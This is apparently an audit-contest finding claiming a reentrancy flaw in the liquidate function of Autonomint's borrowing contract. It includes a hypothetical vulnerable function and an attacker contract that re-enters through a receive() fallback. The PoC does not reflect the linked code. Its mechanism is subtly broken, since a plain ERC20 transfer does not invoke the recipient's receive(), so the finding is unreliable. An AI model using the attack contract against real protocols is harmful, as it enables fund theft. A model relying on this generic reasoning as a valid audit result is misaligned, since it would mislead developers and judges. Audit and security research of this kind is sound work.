# Reentrancy Risk in liquidate function because not following CEI pattern and no reentrancy guard

# Summary
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L363-L409

The main issue identified is the potential vulnerability to a reentrancy attack in the liquidate function, which doesn't follow the Check-Effects-Interactions (CEI) pattern. This failure occurs because the contract interacts with external systems (e.g., token transfers or calling external protocols like CDS) before updating the internal state.
# Vulnerability Details
### Reentrancy Vulnerability:

External calls (like token transfers or interactions with other contracts) happen before the contract updates its internal state (e.g., marking the liquidation or adjusting the balance).
An attacker can exploit this sequence to re-enter the contract and manipulate state variables, potentially leading to malicious fund withdrawals or inconsistent contract states.
### Consequences:
Funds can be drained: Attackers could repeatedly withdraw funds by exploiting reentrancy.
Inconsistent contract state: The contract’s internal state might not match the actual state of the system, causing incorrect behaviors (e.g., liquidation status might not update correctly).
Operational failure: The contract might fail to function as intended, leading to potential financial loss and trust issues.
# PoC
Let’s assume the following vulnerable contract structure for the liquidate function:

```solidity

function liquidate(address account) external {
    // Step 1: External interaction (e.g., token transfer, CDS call)
    externalToken.transfer(account, amount);
    
    // Step 2: Update internal state (e.g., mark account as liquidated)
    liquidations[account] = true;  
}
```
An attacker can deploy a malicious contract that re-enters the liquidate function before the internal state update, triggering multiple liquidations.

### Malicious Contract
```solidity

pragma solidity ^0.8.0;

interface VulnerableContract {
    function liquidate(address account) external;
}

contract MaliciousAttack {
    VulnerableContract public vulnerableContract;
    address public targetAccount;

    constructor(address _vulnerableContract, address _targetAccount) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        targetAccount = _targetAccount;
    }

    // This function is called to trigger the attack
    function attack() external {
        vulnerableContract.liquidate(targetAccount);
    }

    // This fallback function is called when the vulnerable contract makes an external call
    receive() external payable {
        // Re-enter the vulnerable contract’s liquidate function
        vulnerableContract.liquidate(targetAccount);
    }
}
```
How the Attack Works:
Initial Liquidation Call: The attacker calls attack() in the MaliciousAttack contract, which calls the vulnerable liquidate function.

External Call Before State Update: Inside the vulnerable contract, the externalToken.transfer(account, amount) is made before updating the liquidation state, meaning the attacker's fallback function is triggered before the liquidation status is updated.

Re-Entry into Liquidate Function: The fallback function (receive()) is executed during the transfer, and it calls the liquidate function again, potentially draining funds or allowing repeated liquidation before the state is marked as liquidated.

Repeated Re-Entrant Calls: The attacker can exploit the sequence of external call (token transfer) followed by internal state changes to repeatedly call the liquidation function, potentially draining the contract's funds.

# Impact
### Severity: High
### Likelihood: Medium to High
### Impact: High
# Recommendations:
### Follow the CEI pattern: 
Always update internal state before interacting with external systems.
### Use Reentrancy Guards: 
Implement mechanisms to prevent reentrancy attacks.
### Ensure Safe External Interactions: 
Validate external calls and ensure they do not compromise contract integrity.
